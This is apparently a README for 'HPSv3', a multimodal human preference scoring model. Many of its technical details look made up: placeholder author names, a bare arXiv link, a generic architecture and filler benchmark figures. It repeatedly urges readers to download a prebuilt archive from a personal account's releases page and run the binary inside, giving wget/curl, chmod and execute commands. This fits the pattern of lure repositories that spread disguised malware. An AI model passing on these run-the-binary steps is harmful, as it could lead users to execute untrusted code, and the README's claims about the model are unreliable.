# HPSv3 — Wide-Spectrum Human Preference Score for ICCV 2025

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/jacob44444/HPSv3/releases)  https://github.com/jacob44444/HPSv3/releases

🧭 A practical, research-grade implementation of HPSv3. HPSv3 scores outputs across modalities and tasks. It targets robust human preference alignment. This repo contains code, models, datasets, and tools used in the ICCV 2025 paper "Towards Wide-Spectrum Human Preference Score (HPSv3)".

[![Paper](https://img.shields.io/badge/Paper-ICCV%202025-lightgrey?style=for-the-badge)](https://arxiv.org)   [![License](https://img.shields.io/badge/License-Apache%202.0-blue?style=for-the-badge)](LICENSE)

<!-- Hero image -->
![HPSv3 hero](https://upload.wikimedia.org/wikipedia/commons/6/6b/Robot-human-hand.jpg)

Table of contents
- About
- Key features
- Release download and quick run
- Installation
- CLI usage
- Python API
- Supported inputs and formats
- Model architecture
- Training regimen
- Evaluation and benchmarks
- Datasets and annotation
- Reproducibility
- Integration patterns
- Security and privacy
- Contributing
- Citation
- License
- Contact

About
- HPSv3 computes human preference scores for model outputs.  
- HPSv3 covers images, text, image-text pairs, audio, and short video.  
- HPSv3 fuses discriminative and preference-learning branches.  
- The system targets cross-domain robustness and low label noise sensitivity.

Key features
- Multimodal scoring. Image, text, audio, and video inputs.  
- Pairwise and absolute scoring modes.  
- Lightweight runtime for batch scoring on CPU.  
- GPU-accelerated inference for production.  
- Open reference implementation and training scripts.  
- Pretrained release assets for common setups.

Release download and quick run
- Download the release archive and execute the packaged runner to test the model.
- Visit and download from the Releases page:
  https://github.com/jacob44444/HPSv3/releases
- The release bundle contains a runnable binary, model weights, and a sample runner script. After download, extract and run the included runner to get a working demo.

Quick demo (Linux)
```bash
# Example file name in the release bundle:
# hpsv3_release_linux_x86_64.tar.gz
wget https://github.com/jacob44444/HPSv3/releases/download/v1.0/hpsv3_release_linux_x86_64.tar.gz
tar -xzf hpsv3_release_linux_x86_64.tar.gz
cd hpsv3_release
chmod +x run_hpsv3
./run_hpsv3 --input sample_inputs.json --mode demo
```

If the release link is unavailable, check the "Releases" section on the repo page.

Installation

Full install (recommended for research)
- Clone the repo, create a virtual environment, and install Python deps.

```bash
git clone https://github.com/jacob44444/HPSv3.git
cd HPSv3
python3 -m venv venv
source venv/bin/activate
pip install -U pip setuptools
pip install -r requirements.txt
```

Prebuilt release (fast test)
- Download and run the release archive. The release contains a compiled runner and the recommended weights.
- Example releases:
  - hpsv3_release_linux_x86_64.tar.gz
  - hpsv3_release_macos_arm64.tar.gz
  - hpsv3_release_win64.zip

Download and execute the release archive from:
https://github.com/jacob44444/HPSv3/releases

Example (macOS)
```bash
curl -L -o hpsv3_macos.tar.gz "https://github.com/jacob44444/HPSv3/releases/download/v1.0/hpsv3_release_macos_arm64.tar.gz"
tar -xzf hpsv3_macos.tar.gz
cd hpsv3_release
./run_hpsv3 --input sample_inputs.json --mode demo
```

Windows
- Download the ZIP from the Releases page.
- Extract and run run_hpsv3.exe or run_hpsv3.bat.

Hardware notes
- CPU-only mode uses vectorized operators.  
- GPU mode uses CUDA or ROCm kernels.  
- For large batches, use GPU.

CLI usage

The repo provides a CLI wrapper for common tasks.

run_hpsv3 CLI
```bash
run_hpsv3 --help
```

Common commands
- Score a single sample:
```bash
run_hpsv3 --mode score --input sample.json --output result.json
```
- Batch score (CSV or JSONL):
```bash
run_hpsv3 --mode batch --input batch.jsonl --batch-size 64 --device cuda:0
```
- Serve as local API:
```bash
run_hpsv3 --mode serve --port 8080 --device cuda:0
```

Input format examples
- Pairwise image comparison (JSON)
```json
{
  "type": "pairwise_image",
  "left": "data/image_a.jpg",
  "right": "data/image_b.jpg",
  "context": "Which image looks more natural?"
}
```
- Text scoring (absolute)
```json
{
  "type": "text",
  "text": "The kitten sits on the moon and hums.",
  "task": "coherence"
}
```

Python API

Install the package locally
```bash
pip install -e .
```

Basic usage
```python
from hpsv3 import HPSv3Scorer

scorer = HPSv3Scorer(device="cuda:0", mode="pairwise")
left = {"image": "path/to/a.jpg"}
right = {"image": "path/to/b.jpg"}
score = scorer.score_pair(left, right, task="quality")
print("Preference score", score)
```

Batch scoring
```python
from hpsv3 import HPSv3Scorer
scorer = HPSv3Scorer(device="cpu", batch_size=32)
samples = [{"text": t} for t in open("texts.txt")]
scores = scorer.score_batch(samples, task="style")
```

Serve via FastAPI
```python
from hpsv3.server import create_app
app = create_app(scorer="cuda:0", max_workers=8)
# uvicorn hpsv3.server:app --host 0.0.0.0 --port 8080
```

Supported inputs and formats

HPSv3 accepts the following modalities:
- Images: JPG, PNG, BMP. Multi-image pairs for comparison.  
- Text: UTF-8 plain text. Both short and long form.  
- Image-Text: captioning, visual question answering prompts.  
- Audio: WAV, sampled at 16 kHz. Clip length up to 30 s.  
- Video: MP4, webm, limited to 10 s for inference.

Schema summary
- JSON for single items.  
- JSONL for batches.  
- CSV allowed for simple tabular workflows.

Model architecture

High-level overview
- HPSv3 uses a multimodal encoder backbone and a preference head.  
- The encoder fuses modality-specific encoders via cross-attention layers.  
- The preference head implements pairwise logistic loss and absolute regression.

Backbone components
- Visual encoder: ResNet-50 variant with patches and attention fusion.  
- Text encoder: Transformer encoder with 12 layers.  
- Audio encoder: Lightweight ConvNet + temporal attention.  
- Video encoder: 3D convolution front-end followed by spatio-temporal attention.

Fusion
- After modality encoders, the model projects to a shared latent space of 1024 dims.  
- Cross-modal tokens use gated cross-attention.  
- The final pooled vector passes to preference head.

Preference head
- Pairwise branch: processes two pooled vectors and outputs logit for left vs right.  
- Absolute branch: outputs scalar in range [-1, 1] for utility prediction.  
- Calibration layer: a small MLP calibrates scores to human-scale.  
- Auxiliary tasks: quality classification, fluency detection, toxicity detection.

Losses
- Pairwise logistic loss for direct preference labels.  
- Regression L1 for absolute labels.  
- Auxiliary cross-entropy for quality labels.  
- Consistency loss: enforces rank consistency across permutations.

Training regimen

Data mixture
- HPSv3 trains on a mixture of curated preference datasets and synthetic comparisons.  
- The mix balances modalities: 40% image, 30% text, 15% image-text, 10% audio, 5% video.

Batch composition
- Multi-task batch sampling. Each batch contains pairwise and absolute examples.  
- Use class-balanced sampling for auxiliary tasks.

Optimization
- Optimizer: AdamW.  
- LR schedule: cosine warmup with linear decay.  
- Typical hyperparams:
  - base_lr = 1e-4
  - weight_decay = 0.01
  - batch_size = 1024 (distributed)
  - warmup_steps = 5000
  - total_steps = 200k

Regularization
- Dropout on transformer layers (p = 0.1).  
- Stochastic depth in visual encoder.  
- Mixup for text via token masking.

Distributed training
- Use PyTorch DDP.  
- Gradient accumulation for large batches on few GPUs.

Checkpointing
- Save checkpoints every 2k steps.  
- Keep top-k checkpoints by validation AUC on pairwise tasks.

Evaluation and benchmarks

Evaluation metrics
- Pairwise accuracy (AUC).  
- Spearman rank correlation with human labels.  
- Kendall tau for rank lists.  
- RMSE for absolute scores.  
- Calibration error for score-to-prob mapping.

Benchmark datasets
- HPS-Image: 50k pairwise image comparisons.  
- HPS-Text: 30k human preference pairs for summarization, style, and coherence.  
- HPS-Multi: 20k multimodal comparisons.

Sample benchmarks (representative)
- Image pairwise AUC: 0.92  
- Text pairwise AUC: 0.88  
- Spearman on ranking tasks: 0.76  
- RMSE on absolute scoring: 0.15

A/B comparison
- HPSv3 improved rank correlation by 8% over HPSv2 on cross-domain tests.  
- HPSv3 reduced calibration error by 35% after calibration layer.

Ablations
- Removing cross-attention reduced multimodal consistency by 6%.  
- Removing auxiliary fluency classifier increased false positive utility for noisy text.

Datasets and annotation

Public datasets used
- COCO captions for image-text pairs.  
- LAION subsets for image preference sampling.  
- Human Summaries dataset for text.  
- AudioSet clips for audio tasks.

Annotation protocol
- We use pairwise annotations collected via crowdsourcing.  
- Each pair gets 5 independent labels.  
- We compute consensus via majority vote and weighted agreement.

Synthetic comparisons
- We generate synthetic pairs using model perturbations.  
- Perturbations include blur, noise, paraphrase, and style shifts.  
- Synthetic data improves robustness and helps train calibration.

Data format and examples
- Each example includes:
  - id: unique id
  - modality: image / text / audio / video / multi
  - left: path or content
  - right: path or content
  - context: optional prompt
  - label: left/right/absolute value

Reproducibility

Seed control
- Set random seed in Python, NumPy, and torch.  
- Use deterministic dataloader when needed.

Environment
- Record CUDA, cuDNN, OS, and Python versions in logs.  
- Use Docker to pin dependencies.

Docker
- We provide a Dockerfile for reproducible runs.
```bash
docker build -t hpsv3:latest .
docker run --gpus all -it -v $(pwd):/work hpsv3:latest /bin/bash
```

Checkpoint release
- We publish model checkpoints in the Releases page. Download and use the provided runner to reproduce published numbers.
- Release page: https://github.com/jacob44444/HPSv3/releases

Integration patterns

Batch scoring
- Use the batch scorer for large datasets. Write input as JSONL and invoke the CLI or Python batch method.

Streaming scoring
- Serve model behind a REST endpoint. Use the built-in FastAPI app. The app accepts JSON and returns score and metadata. Use worker processes to scale.

Embedding export
- Export the pooled latent for downstream tasks. Use scorer.embed() to extract vectors.

Human-in-the-loop
- Use pairwise mode to collect new labels. Feed new labels into the training pipeline for continuous improvement.

API design example (REST)
- Endpoint: POST /score
- Payload:
```json
{"type":"pairwise_image","left":"s3://.../a.jpg","right":"s3://.../b.jpg","task":"naturalness"}
```
- Response:
```json
{"score":0.81,"winner":"left","confidence":0.77}
```

Security and privacy

Data handling
- The repo does not transmit data outside the host by default.  
- When using prebuilt releases, verify checksums.

Model risks
- HPSv3 can reflect annotator bias. Evaluate before production use.  
- Use auxiliary toxicity classifiers to detect unsafe content.

Access controls
- Run the server behind an authentication layer for production.  
- Use token-based auth for the API.

Contributing

How to contribute
- Fork the repo and open a PR.  
- Follow the coding style in CONTRIBUTING.md.  
- Add tests for new features.

Issue process
- Create an issue for bugs or feature requests.  
- Use labels to track priority.

Pull request checklist
- Add unit tests where applicable.  
- Update docs and examples.  
- Run lint and unit tests.

Developer notes
- We use pre-commit hooks. Install them via:
```bash
pre-commit install
```

Testing
- Unit tests use pytest. Run tests:
```bash
pytest tests -q
```

Roadmap
- Expand support for long video.  
- Add federated learning demo.  
- Publish additional pretrained checkpoints.

Troubleshooting

Common errors
- Out-of-memory: reduce batch_size or use CPU.  
- Missing CUDA: set device=cpu in config.

If a release asset fails to run, check the Releases page for updated assets and instructions:
https://github.com/jacob44444/HPSv3/releases

Design rationale (technical details)

Why pairwise + absolute
- Pairwise labels produce robust rank signals.  
- Absolute labels provide magnitude calibration.  
- Joint training yields better calibration and transfer.

Why fusion via cross-attention
- Cross-attention captures fine-grained cross-modal signals.  
- It improves consistency for tasks like image caption preference.

Why auxiliary tasks
- Auxiliary tasks reduce spurious correlations.  
- They provide signal for fluency, toxicity, and factuality.

Implementation notes

Runtime optimizations
- Use mixed precision for GPU inference.  
- Use TorchScript to export fast CPU runners.  
- Fuse operators for image preprocessing.

I/O pipeline
- Preload images and compress in-memory.  
- Use mmap for large datasets.

Model export
- Export to ONNX for cross-platform use.  
- We include an exporter: tools/export_to_onnx.py

Example export
```bash
python tools/export_to_onnx.py --checkpoint ckpt.pt --out hpsv3.onnx --opset 14
```

Benchmarks and profiling
- Use nvprof or torch.profiler for GPU profiling.  
- Use cProfile for CPU bottlenecks.

Advanced topics

Calibration
- We provide isotonic regression and Platt scaling modules.  
- Fit calibration on held-out human labels.

Ensembling
- Ensemble multiple HPSv3 checkpoints via weighted average on logits.  
- Ensemble improves robustness on low-data domains.

Domain adaptation
- Fine-tune on small domain datasets with low lr and early stopping.  
- Use mixup to avoid overfitting.

Active learning
- Use HPSv3 to rank human annotation priorities.  
- Select pairs with high model uncertainty for annotation.

Human labeler UI
- We include a reference web tool for collecting pairwise labels.  
- The tool exports CSV and JSONL.

Storage formats and schema

JSONL example for pairwise
```jsonl
{"id":"1","type":"pair","left":"s3://.../imgA.jpg","right":"s3://.../imgB.jpg","context":"Which looks cleaner?","labels":[1,0,1,1,0]}
{"id":"2","type":"abs","item":"text","content":"A vibrant sunrise.","score":0.7}
```

CSV
- header: id,type,left,right,context,label1,label2,...

Model cards and explainability

Explainability modules
- Saliency maps for image inputs.  
- Attention rollout for text.  
- Token importance for text scoring.

Model card
- The repo includes a model card that lists training data sources, evaluation results, and known limitations.

Ethics and bias

Bias assessment
- We test for demographic bias on curated benchmarks.  
- We report per-group metrics in evaluation logs.

Mitigation
- Balanced sampling.  
- Reject-sampling when annotator agreement is low.

Legal

Data licensing
- Use only datasets allowed for research. See DATA_LICENSES.md.

Model licensing
- The code uses Apache 2.0. See LICENSE.

Citation

If you use HPSv3, cite:
```bibtex
@inproceedings{hpsv3_iccv2025,
  title = {HPSv3: Towards Wide-Spectrum Human Preference Score},
  author = {Author, A. and Author, B. and Author, C.},
  booktitle = {ICCV},
  year = {2025}
}
```

Acknowledgements
- We list dataset contributors and annotation partners in ACKS.md.

Checklist for reproducible runs

1. Clone the repo.
2. Install deps and set environment variables.
3. Download the release archive or checkpoints from Releases.
   - Visit: https://github.com/jacob44444/HPSv3/releases
4. Run sample inference to verify.
5. Run training script with the provided config.

Files in the release archive (typical)
- run_hpsv3 (runner binary)
- hpsv3_config.yaml (runtime config)
- weights/ (pretrained checkpoints)
- sample_inputs.json (demo inputs)
- run_hpsv3.bat (Windows runner)
- README_RELEASE.md (release notes)

Example workflow for a production deploy

1. Download release assets from the Releases page:
   https://github.com/jacob44444/HPSv3/releases
2. Verify checksums.
3. Export the ONNX runtime if you need cross-platform support.
4. Deploy the model in a container with GPU or CPU settings.
5. Monitor model outputs and data drift.

Frequently asked questions

Q: Which tasks does HPSv3 handle?
A: Pairwise preference, absolute scoring, quality classification, and domain-specific scoring.

Q: Can HPSv3 work on long video?
A: The current release targets short video. We plan longer video support in future releases.

Q: How to add custom tasks?
A: Implement a dataset loader, add a task head, and update the config. See docs/tasks.md.

Q: Where are the model weights?
A: Model weights live in the release bundles on the Releases page:
https://github.com/jacob44444/HPSv3/releases

Images and media used in docs
- Hero and sample images come from public domain and permissive images. See IMAGES.md for sources.

Contact
- Create issues for bugs and feature requests.  
- For direct contact, open an issue with the label "contact".  
- Maintain mailing list and discussion board via GitHub Discussions.

Appendix A — Example configs

configs/hpsv3_base.yaml (excerpt)
```yaml
model:
  name: hpsv3
  hidden_dim: 1024
  fusion: cross_attention
training:
  optimizer:
    name: AdamW
    lr: 1e-4
  batch_size: 1024
  total_steps: 200000
data:
  modalities: ["image","text","audio","video"]
```

Appendix B — Tools

- tools/export_to_onnx.py
- tools/collect_annotations.py
- tools/visualize_attention.py

Appendix C — Release notes (example)

v1.0
- Initial public release.
- Includes pretrained weights for multimodal scoring.
- CLI and Python API.
- Docker container and ONNX exporter.

v1.1 (planned)
- Better video support.
- Additional checkpoints for low-resource domains.

End of README content.